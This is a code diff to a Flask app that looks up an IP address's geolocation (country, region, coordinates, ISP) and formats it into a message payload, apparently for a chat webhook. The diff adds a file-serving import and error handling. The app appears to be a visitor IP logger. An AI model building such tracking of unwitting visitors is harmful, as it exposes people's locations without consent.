@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, send_from_directory
 import requests
 import json
 
@@ -13,12 +13,16 @@ def get_geolocation(ip):
     js = json.loads(resp.content)
 
     payload = ''
-    payload += f"*IP Address*  : `{js['query']}` \n"
-    payload += f"*County*      : `{js['country']}`\n"
-    payload += f"*Region*      : `{js['regionName']}`\n"
-    payload += f"*Latitude*    : `{js['lat']}`\n"
-    payload += f"*Longitude*   : `{js['lon']}`\n"
-    payload += f"*ISP*         : `{js['isp']}`\n"
+
+    try: 
+        payload += f"*IP Address*  : `{js['query']}` \n"
+        payload += f"*County*      : `{js['country']}`\n"
+        payload += f"*Region*      : `{js['regionName']}`\n"
+        payload += f"*Latitude*    : `{js['lat']}`\n"
+        payload += f"*Longitude*   : `{js['lon']}`\n"
+        payload += f"*ISP*         : `{js['isp']}`\n"
+    except Exception as e:
+        payload = f'''[-] Failed: GOT AN ERROR\nPAYLOAD: `{js}`'''
 
     content = {
         "content" : payload,
